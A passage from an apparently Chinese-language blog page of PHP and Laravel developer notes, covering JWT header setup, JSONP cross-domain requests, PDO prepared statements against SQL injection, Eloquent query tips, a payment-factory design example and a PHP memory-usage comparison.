中加入该方法就可以了。</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">setAuthHeader</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $chain = $<span class="keyword">this</span>-&gt;app[<span class="string">'tymon.jwt.parser'</span>]-&gt;getChain();</span><br><span class="line"></span><br><span class="line">        $chain[<span class="number">0</span>] = $chain[<span class="number">0</span>]-&gt;setHeaderPrefix(<span class="string">'项目的 token 前缀'</span>)-&gt;setHeaderName(<span class="string">'项目的头信息 key'</span>);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;app[<span class="string">'tymon.jwt.parser'</span>]-&gt;setChain($chain);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ajax-实现跨域"><a href="#ajax-实现跨域" class="headerlink" title="ajax 实现跨域"></a>ajax 实现跨域</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">                <span class="keyword">async</span>: <span class="literal">true</span>,</span><br><span class="line">                url: <span class="string">"http://172.16.112.3/api.php"</span>,</span><br><span class="line">                type: <span class="string">"GET"</span>,</span><br><span class="line">                dataType: <span class="string">"jsonp"</span>, <span class="comment">// 返回的数据类型，设置为JSONP方式</span></span><br><span class="line">                jsonp: <span class="string">'callback'</span>, <span class="comment">//指定一个查询参数名称来覆盖默认的 jsonp 回调参数名 callback</span></span><br><span class="line">                jsonpCallback: <span class="string">'handleResponse'</span>, <span class="comment">//设置回调函数名</span></span><br><span class="line">                success: <span class="function"><span class="keyword">function</span> (<span class="params">response, status, xhr</span>) </span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'状态为：'</span> + status + <span class="string">',状态是：'</span> + xhr.statusText);</span><br><span class="line">                    <span class="built_in">console</span>.log(response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">原生 js 实现跨域</span><br><span class="line"></span><br><span class="line"> <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//定义一个处理Jsonp返回数据的回调函数</span></span><br><span class="line">            <span class="built_in">window</span>[<span class="string">"callback"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">object</span>) </span>&#123;</span><br><span class="line">                obj.success(object);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">            <span class="comment">//组合请求URL</span></span><br><span class="line">            script.src = obj.url + <span class="string">"?callback=callback"</span>;</span><br><span class="line">            <span class="keyword">for</span> (key <span class="keyword">in</span> obj.data) &#123;</span><br><span class="line">                script.src += <span class="string">"&amp;"</span> + key + <span class="string">"="</span> + obj.data[key];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将创建的新节点添加到BOM树上</span></span><br><span class="line">            <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(script);</span><br><span class="line">        &#125;</span><br><span class="line">        jsonp(&#123;</span><br><span class="line">            url: <span class="string">"http://172.16.112.3/api.php"</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="PDO-防止-sql-注入"><a href="#PDO-防止-sql-注入" class="headerlink" title="PDO 防止 sql 注入"></a>PDO 防止 sql 注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setAttribute（） 这一行是强制性的，它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。这可以确保 SQL 语句和相应的值在传递到 mysql 服务器之前是不会被 PHP 解析的（禁止了所有可能的恶意 SQL 注入攻击）。虽然你可以配置文件中设置 字符集的属性 (charset=utf8)，但是需要格外注意的是，老版本的 PHP（ &lt; <span class="number">5.3</span><span class="number">.6</span>）在 DSN 中是忽略字符参数的。</span><br><span class="line">我们来看一段完整的代码使用实例：https:<span class="comment">//learnku.com/articles/27000#topnav</span></span><br><span class="line"></span><br><span class="line">  $user=$_POST[<span class="string">'user'</span>]; $pass=$_POST[<span class="string">'pass'</span>];</span><br><span class="line">  $dbh = <span class="keyword">new</span> \PDO(<span class="string">"mysql:host=localhost; dbname=zz"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line">  $dbh-&gt;setAttribute(\PDO::ATTR_EMULATE_PREPARES, <span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//禁用prepared statements的仿真效果</span></span><br><span class="line"><span class="comment">//        $dbh-&gt;exec    ("set names 'utf8'");</span></span><br><span class="line">  $sql=<span class="string">"select * from test where user=? and pass=?"</span>;</span><br><span class="line">  $stmt = $dbh-&gt;prepare($sql);</span><br><span class="line">  $exeres = $stmt-&gt;execute(array($user, $pass));</span><br><span class="line">  <span class="keyword">if</span> ($exeres) &#123;</span><br><span class="line">  <span class="comment">//while条件为真时,输出$row,</span></span><br><span class="line">  <span class="keyword">while</span></span><br><span class="line">  ($row = $stmt-&gt;fetch(\PDO::FETCH_ASSOC))&#123;</span><br><span class="line">  print_r($row);die();</span><br><span class="line"> &#125;  <span class="comment">//失败输出登录失败</span></span><br><span class="line">  print_r(<span class="string">"登录失败"</span>);die();</span><br><span class="line"> &#125;</span><br><span class="line">当调用 prepare () 时，查询语句已经发送给了数据库服务器，此时只有占位符？发送过去，没有用户提交的数据；当调用到 execute () 时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL 攻击者没有一点机会。</span><br></pre></td></tr></table></figure>
<h3 id="Eloquent-关系中使用-orderBy"><a href="#Eloquent-关系中使用-orderBy" class="headerlink" title="Eloquent 关系中使用 orderBy()"></a>Eloquent 关系中使用 orderBy()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">productsByName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(Product::<span class="class"><span class="keyword">class</span>)-&gt;<span class="title">orderBy</span>('<span class="title">name</span>')</span>;</span><br><span class="line">&#125;</span><br><span class="line">$products = Product::whereDate(<span class="string">'created_at'</span>, <span class="string">'2018-01-31'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereMonth(<span class="string">'created_at'</span>, <span class="string">'12'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereDay(<span class="string">'created_at'</span>, <span class="string">'31'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereYear(<span class="string">'created_at'</span>, date(<span class="string">'Y'</span>))-&gt;get(); </span><br><span class="line">$products = Product::whereTime(<span class="string">'created_at'</span>, <span class="string">'='</span>, <span class="string">'14:13:58'</span>)-&gt;get();</span><br><span class="line">Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'account'</span>, <span class="string">'as'</span> =&gt; <span class="string">'account.'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Route::get(<span class="string">'login'</span>, <span class="string">'AccountController@login'</span>);     </span><br><span class="line">    Route::get(<span class="string">'register'</span>, <span class="string">'AccountController@register'</span>);</span><br><span class="line">    Route::group([<span class="string">'middleware'</span> =&gt; <span class="string">'auth'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;         </span><br><span class="line">        Route::get(<span class="string">'edit'</span>, <span class="string">'AccountController@edit'</span>);     </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">恢复多个软删除https:<span class="comment">//learnku.com/articles/26673 </span></span><br><span class="line"></span><br><span class="line">如果记录使用了软删除，那么你就可以一次恢复多条软删除记录。</span><br><span class="line"></span><br><span class="line">Post::withTrashed()-&gt;where(<span class="string">'author_id'</span>, <span class="number">1</span>)-&gt;restore();</span><br><span class="line"><span class="comment">// Author -&gt; hasMany(Book::class) </span></span><br><span class="line">$authors = Author::has(<span class="string">'books'</span>, <span class="string">'&gt;'</span>, <span class="number">5</span>)-&gt;get();</span><br><span class="line">$users = User::all([<span class="string">'id'</span>, <span class="string">'name'</span>, <span class="string">'email'</span>]);</span><br><span class="line">在执行 Eloqument 查询后，你可以使用 map() 来修改行。</span><br><span class="line"></span><br><span class="line">$users = User::where(<span class="string">'role_id'</span>, <span class="number">1</span>)-&gt;get()-&gt;map(<span class="function"><span class="keyword">function</span> (<span class="params">User $user</span>) </span>&#123;</span><br><span class="line">    $user-&gt;some_column = some_function($user);</span><br><span class="line">    <span class="keyword">return</span> $user;</span><br><span class="line">&#125;);</span><br><span class="line">当一个关系被调用时，如果它不存在，则会出现致命的错误，例如 $post-&gt;user-&gt;name ，可以使用 withDefault() 来避免。</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 获取文章作者 */</span> </span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">user</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;belongsTo(<span class="string">'App\User'</span>)-&gt;withDefault(); </span><br><span class="line">&#125;</span><br><span class="line">$users = App\Book::<span class="keyword">with</span>(<span class="string">'author:id,name'</span>)-&gt;get();</span><br></pre></td></tr></table></figure>
<h3 id="开闭原则"><a href="#开闭原则" class="headerlink" title="开闭原则"></a>开闭原则</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">　Controller 类，只接受用户输入，返回输出，不需要具体处理背后的事情。当需要表单验证的时候，注入相应的 Request 类。当需要数据操作时，注入相应的 Repository 或 Service 或 Factory。</span><br><span class="line"></span><br><span class="line">　　Model 类，将修改器，访问器定义在 trait 然后 use 进来。数据操作逻辑分离成 Repository。</span><br><span class="line"></span><br><span class="line">　　Helper.php 全局函数，将同类型的 helper 分离成单独的文件，使其高内聚。然后在 Helper.php 中引入</span><br><span class="line">所有具体的类都需要实现 Interface 中定义的方法。</span><br><span class="line">在 Factory 中实例化具体的类。</span><br><span class="line">在 Controller 中使用 Factory。</span><br><span class="line"></span><br><span class="line">首先创建一个 PaymentInterface，任何支付方式都必须实现此接口中定义的方法。</span><br><span class="line"></span><br><span class="line">interface PaymentInterface &#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function">接着，创建两个实现 <span class="title">PaymentInterface</span> 的具体类。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">Alipay</span> <span class="title">implements</span> <span class="title">PaymentInterface</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 支付宝支付具体代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wechat</span> <span class="title">implements</span> <span class="title">PaymentInterface</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 微信支付具体代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">然后，创建一个支付工厂，此工厂用来实例化具体的支付类</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PeymentFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">$payType</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($payType) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Alipay'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Alipay();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Wechat'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Wechat();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'未知支付方式'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">最后，在控制器中注入此 Factory</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">pay</span> (<span class="params">Request $request, PaymentFactory $paymentFactory</span>) </span>&#123;</span><br><span class="line">    $payment = $paymentFactory-&gt;init($request-&gt;payType);</span><br><span class="line">    $payment-&gt;pay();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="内存占用高，速度就会提高"><a href="#内存占用高，速度就会提高" class="headerlink" title="内存占用高，速度就会提高"></a>内存占用高，速度就会提高</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'class a __construct'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a1'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a2'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a3'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/laravel/t/27033</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    protected $cache;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'class b __construct'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b1</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b2</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $cache=[];</span><br><span class="line">        <span class="keyword">if</span>(isset($cache[$tags])) <span class="keyword">return</span> $cache[$tags];</span><br><span class="line">        <span class="keyword">return</span> $cache[$tags]=<span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b3</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset($<span class="keyword">this</span>-&gt;cache[$tags])) <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache[$tags];</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache[$tags]=<span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b1()-&gt;a1();</span><br><span class="line">$b-&gt;b1()-&gt;a2();</span><br><span class="line">$b-&gt;b1()-&gt;a3();</span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b2()-&gt;a1();</span><br><span class="line">$b-&gt;b2()-&gt;a2();</span><br><span class="line">$b-&gt;b2()-&gt;a3();</span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b3()-&gt;a1();</span><br><span class="line">$b-&gt;b3()-&gt;a2();</span><br><span class="line">$b-&gt;b3()-&gt;a3();</span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line">内存占用高，速度就会提高，反之，就速度就会降低，上面那个 b1 和 b2 后面应该加一个 unset ($b), 内存计算才准确吧</span><br><span class="line">这应该就是连接数据库的时候为什么推荐使用短链接而不是长链接的原因吧，长连接占用内存高，资源多吧，不即时释放</span><br><span class="line"></span><br><span class="line">调用第二个 b1 的时候，第一个 b1 创建出来的 a 就被销毁了啊，就不占内存了啊。</span><br><span class="line">这题还有一个目的，在同一个进程下想减少 <span class="keyword">new</span> 的次数，结果画蛇添足了</span><br></pre></td></tr></table></figure>
<h3 id="关联模型字段取别名查询不出数据"><a href="#关联模型字段取别名查询不出数据" class="headerlink" title="关联模型字段取别名查询不出数据"></a>关联模型字段取别名查询不出数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/22489#topnav</span></span><br><span class="line">laravel 自带的 ORM 是个神器，针对这种有关系的数据，完全可以使用关系模型，既简单又实用，由于这里只有一个数据表，关系也存在于同一张表，所以可以直接使用自关联，将两个关系定义在同一个 Model 里面：</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasOne($<span class="keyword">this</span>, <span class="string">'id'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">children</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany($<span class="keyword">this</span>, <span class="string">'parent_id'</span>, <span class="string">'id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">关系定义里面的参数也可以这样写：</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasOne(get_class($<span class="keyword">this</span>), $<span class="keyword">this</span>-&gt;getKeyName(), <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">children</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(get_class($<span class="keyword">this</span>), <span class="string">'parent_id'</span>, $<span class="keyword">this</span>-&gt;getKeyName());</span><br><span class="line">    &#125;</span><br><span class="line">查询包含子菜单的数据</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Admin_menu::<span class="keyword">with</span>([<span class="string">'children'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">                $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">            &#125;])</span><br><span class="line">            -&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">where <span class="keyword">in</span> （array）这里的 array 是依赖主键的名称的，在关联查询的时候，已经定义了 id = [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6.</span>..]，但是我们最后给 id 取了别名，变成 MaindId，所以找不到名为 id 的数组。</span><br><span class="line">如果真是这样，我们试着再给它加上 id，让它能够找到名为 id 的数组</span><br><span class="line">    \DB::connection()-&gt;enableQueryLog(); <span class="comment">// 开启查询日志</span></span><br><span class="line">    $menus =  Admin_menu::<span class="keyword">with</span>([<span class="string">'children'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">        $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;])</span><br><span class="line">    -&gt;select(<span class="string">'id'</span>, <span class="string">'id as MainId'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">    -&gt;get();</span><br><span class="line">    foreach (\DB::getQueryLog() <span class="keyword">as</span> $sql) &#123;</span><br><span class="line">        dump($sql[<span class="string">'query'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    依赖关联主键 localKey 的查询，不能缺少相应的字段，也就是说 select 应该包含对应 localKey，如果要取别名应该额外添加，形如：</span><br><span class="line">    </span><br><span class="line">    select(<span class="string">'id'</span>, <span class="string">'id as MainId'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>, <span class="string">'parent_id as extraId'</span>)</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $menus = Admin_menu::<span class="keyword">with</span>([<span class="string">'parent'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">                $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">            &#125;])</span><br><span class="line">            -&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;transformer($menus);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">transformer</span>(<span class="params">$items</span>) </span>&#123;</span><br><span class="line">        $data = [];</span><br><span class="line">        foreach ($items ?? [] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            $data[] = [</span><br><span class="line">                <span class="string">'mainId'</span> =&gt; $item-&gt;id,</span><br><span class="line">                <span class="string">'title'</span> =&gt; $item-&gt;title,</span><br><span class="line">                <span class="string">'parent_id'</span> =&gt; $item-&gt;parent_id,</span><br><span class="line">                <span class="string">'children'</span> =&gt; $item-&gt;children,</span><br><span class="line">            ];</span><br><span 